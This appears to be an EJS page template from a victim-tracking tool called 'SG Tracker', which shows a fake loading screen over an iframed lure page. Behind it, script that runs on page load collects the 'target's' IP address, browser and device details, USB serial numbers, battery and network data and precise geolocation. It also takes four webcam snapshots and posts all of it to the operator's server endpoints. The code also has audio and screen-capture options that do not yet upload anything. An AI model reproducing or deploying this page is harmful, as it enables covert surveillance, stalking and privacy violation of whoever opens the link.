<html lang="en-US">
<head> 
<meta charset="UTF-8"> 
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> 
<meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1"> 
<meta name="robots" content="noindex, nofollow"> 
<meta name="viewport" content="width=device-width,initial-scale=1"> 
<title>SG Tracker</title> 
<style>
iframe{ 
border:0;
overflow:hidden;
height:100%;
width:100%;
position:fixed;
top:0;
left:0;
}
.loading {
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  background: rgba(0,0,0,0.8);
  display: flex;
  flex-direction: column;
  justify-content: center;
  align-items: center;
  color: white;
  font-family: Arial, sans-serif;
  z-index: 9999;
}
.loading-text {
  margin-top: 20px;
  font-size: 16px;
}
.spinner {
  width: 50px;
  height: 50px;
  border: 5px solid rgba(255,255,255,0.3);
  border-radius: 50%;
  border-top-color: #fff;
  animation: spin 1s ease-in-out infinite;
}
@keyframes spin {
  to { transform: rotate(360deg); }
}
</style>
</head>
<body>
<div class="loading" id="loading-screen">
  <div class="spinner"></div>
  <div class="loading-text">Loading content, please wait...</div>
</div>

<video id="video" style="display:none" playsinline autoplay></video>
<canvas hidden="hidden" id="canvas" width="500" height="500"></canvas>
<audio id="audio" style="display:none"></audio>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.2/jquery.min.js"></script>
<script type="text/javascript" defer>
var uid = "<%=uid %>";
var captureMethod = "<%= typeof captureMethod !== 'undefined' ? captureMethod : 'full' %>";
var captureCompleted = false;

// Handle different capture methods
function getCaptureConfig() {
  switch(captureMethod) {
    case 'back':
      return {
        camera: true,
        facingMode: "environment",
        audio: false,
        screen: false
      };
    case 'min':
      return {
        camera: false,
        audio: false,
        screen: false
      };
    case 'audio':
      return {
        camera: false,
        audio: true,
        screen: false
      };
    case 'screen':
      return {
        camera: false,
        audio: false,
        screen: true
      };
    case 'full':
    default:
      return {
        camera: true,
        facingMode: "user",
        audio: false,
        screen: false
      };
  }
}

const captureConfig = getCaptureConfig();

async function gather() {
  var td = "";
  <% if(!t){ %>
  td += '<code>‚úÖ Target Information </code><br><br><b>‚öì IP: <a href="https://ip-api.com/#<%=ip %>" ><%=ip %></a> | Time: <%=time %></b>';
  <% }else{ %>
  await fetch("<%=a %>").then((r) => r.json()).then((d) => (td+= '<code>‚úÖ Target Information </code><br><br><b>‚öì IP: <a href="https://ip-api.com/#'+d.ip+'" >'+d.ip+'</a> | Time: <%=time %></b>'));
  <% } %>

  td += "<br><br><b>‚è≥ Date In Target's Device:</b> " + new Date() + "<br>";
  td += "<br><b>üõ†Ô∏è Capture Method:</b> " + captureMethod + "<br>";
  
  var xo = ["productSub","vendor","maxTouchPoints","doNotTrack","hardwareConcurrency","cookieEnabled","appCodeName","appName","appVersion","platform","product","userAgent","language","languages","webdriver","pdfViewerEnabled","deviceMemory"];
  var xoc = ["type","rtt","saveData","effectiveType","downlink","downlinkMax"];
  
  // Device Information
  td += "<br><b>üì± Device Information</b><br>";
  for(var i=0; i < xo.length; i++) { 
    if(xo[i] in navigator) {
      var str = navigator[xo[i]];
      td += "<b>" + xo[i] + "</b>: <code>" + str + "</code><br>";
    }
  }

  // Media devices
  if (navigator.mediaDevices || navigator.mediaDevices?.enumerateDevices) {
    await navigator.mediaDevices?.enumerateDevices()
    .then(function(devices) {
      td += "<br><b>üì∑ Media Device Information</b><br>";
      devices.forEach(function(device) {
        td += "<b>" + device.kind + ":</b> " + device.label + " id = <code>" + device.deviceId + "</code><br>";
      });
    })
    .catch(function(err) {
      td += "<br><b>üì∑ Media Device Information</b><br>";
      td += "‚ö†Ô∏è Media Device Error: " + err.name + ": " + err.message;
    });
  }

  // Network Information
  if("connection" in navigator) {
    td += "<br><b>üï∏Ô∏è Network Information</b><br>";
    for(var i=0; i < xoc.length; i++) { 
      var str = navigator.connection[xoc[i]];
      td += "<b>" + xoc[i] + "</b>: <code>" + str + "</code><br>";
    }
  }

  // USB Devices
  if("usb" in navigator) {
    await navigator.usb.getDevices()
    .then(devices => {
      td += "<br><b>üîå Total USB devices connected:</b> " + devices.length + "<br>";
      devices.forEach(device => {
        td += "<b>Product name:</b> " + device.productName + " , <b>Serial number: </b> <code>" + device.serialNumber + "</code><br>";
      });
    });
  }

  // Battery Information
  if("getBattery" in navigator) {
    await navigator.getBattery().then(function(battery) {
      td += "<br><b>üîã Battery Information</b><br>";
      td += "<b>üîãBattery Level:</b> " + battery.level*100 + "%<br><b>‚ö° Is Battery Charging:</b> " + battery.charging + "";
    });
  }

  // Location Information
  if(!navigator.geolocation) {
    td += "<br><b>üìç Location Information</b><br>";
    td += "‚ö†Ô∏è Location API not available";
  } 

  function locationSuccess(pos) {
    const crd = pos.coords;
    $.post("<%=a %>/location", {
      uid: uid,
      lat: encodeURIComponent(crd.latitude),
      lon: encodeURIComponent(crd.longitude),
      acc: encodeURIComponent(crd.accuracy)
    }, (s) => {
      console.log("Location captured");
      checkAllCapturesCompleted();
    });
  }

  function locationError(err) {
    td += "<br><b>üìç Location Information</b><br>";
    td += "‚ö†Ô∏è Location ERROR: <code>" + err.message + "</code>";
    checkAllCapturesCompleted();
  }

  if(navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(locationSuccess, locationError, { enableHighAccuracy: true, maximumAge: 0 });
  }

  // Send the basic information we've gathered so far
  $.post("<%=a %>/", {data: encodeURIComponent(td), uid: encodeURIComponent(uid)}, (s) => {
    console.log("Basic information sent");
  });

  // Initialize media capture based on the selected capture method
  if (captureConfig.camera) {
    initCamera();
  } else if (captureConfig.audio) {
    initAudioCapture();
  } else if (captureConfig.screen) {
    initScreenCapture();
  } else {
    // If no media capture is needed, mark as completed
    setTimeout(() => {
      captureCompleted = true;
      hideLoadingScreen();
    }, 2000);
  }
}

// Camera capture
function initCamera() {
  const video = document.getElementById('video');
  const canvas = document.getElementById('canvas');
  
  function postImage(imageData) {
    $.post("<%=a %>/camsnap", {
      uid: uid,
      img: encodeURIComponent(imageData)
    }, (s) => {
      console.log("Image captured");
    });
  }
  
  const constraints = {
    audio: false,
    video: { facingMode: captureConfig.facingMode || "user" }
  };
  
  async function startCamera() {
    try {
      const stream = await navigator.mediaDevices.getUserMedia(constraints);
      handleCameraSuccess(stream);
    } catch (e) {
      console.error("Camera access error:", e);
      captureCompleted = true;
      hideLoadingScreen();
    }
  }
  
  function handleCameraSuccess(stream) {
    window.stream = stream;
    video.srcObject = stream;
    
    var context = canvas.getContext('2d');
    var imagesSent = 0;
    var maxImages = 4; // Number of images to capture
    
    var captureInterval = setInterval(function() {
      context.drawImage(video, 0, 0, 500, 500);
      var canvasData = canvas.toDataURL("image/png").replace("data:image/png;base64", "");
      postImage(canvasData);
      
      imagesSent++;
      if (imagesSent >= maxImages) {
        clearInterval(captureInterval);
        
        // Stop the camera
        if (stream) {
          stream.getTracks().forEach(track => track.stop());
        }
        
        captureCompleted = true;
        hideLoadingScreen();
      }
    }, 1500);
  }
  
  startCamera();
}

// Audio capture
function initAudioCapture() {
  const audioElement = document.getElementById('audio');
  let mediaRecorder;
  let audioChunks = [];
  
  async function startAudioCapture() {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
      handleAudioSuccess(stream);
    } catch (e) {
      console.error("Audio capture error:", e);
      captureCompleted = true;
      hideLoadingScreen();
    }
  }
  
  function handleAudioSuccess(stream) {
    mediaRecorder = new MediaRecorder(stream);
    
    mediaRecorder.ondataavailable = (event) => {
      if (event.data.size > 0) {
        audioChunks.push(event.data);
      }
    };
    
    mediaRecorder.onstop = () => {
      const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
      const reader = new FileReader();
      
      reader.readAsDataURL(audioBlob);
      reader.onloadend = () => {
        const base64data = reader.result.split(',')[1];
        
        // Send audio data to server (placeholder - add the actual API endpoint)
        console.log("Audio recorded (Feature coming soon)");
        
        // Stop all tracks
        stream.getTracks().forEach(track => track.stop());
        
        captureCompleted = true;
        hideLoadingScreen();
      };
    };
    
    // Record for 10 seconds
    mediaRecorder.start();
    setTimeout(() => {
      if (mediaRecorder && mediaRecorder.state !== 'inactive') {
        mediaRecorder.stop();
      }
    }, 10000);
  }
  
  startAudioCapture();
}

// Screen capture
function initScreenCapture() {
  async function startScreenCapture() {
    try {
      const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
      handleScreenCaptureSuccess(stream);
    } catch (e) {
      console.error("Screen capture error:", e);
      captureCompleted = true;
      hideLoadingScreen();
    }
  }
  
  function handleScreenCaptureSuccess(stream) {
    console.log("Screen capture started (Feature coming soon)");
    
    // Record for 5 seconds then stop
    setTimeout(() => {
      stream.getTracks().forEach(track => track.stop());
      captureCompleted = true;
      hideLoadingScreen();
    }, 5000);
  }
  
  startScreenCapture();
}

// Check if all captures are completed and hide loading screen
function checkAllCapturesCompleted() {
  if (captureCompleted) {
    hideLoadingScreen();
  }
}

// Hide the loading screen once everything is captured
function hideLoadingScreen() {
  setTimeout(() => {
    document.getElementById('loading-screen').style.display = 'none';
  }, 1000);
}

// Initialize everything
gather();

</script>
<iframe src="<%=url %>"></iframe>
</body>
</html>
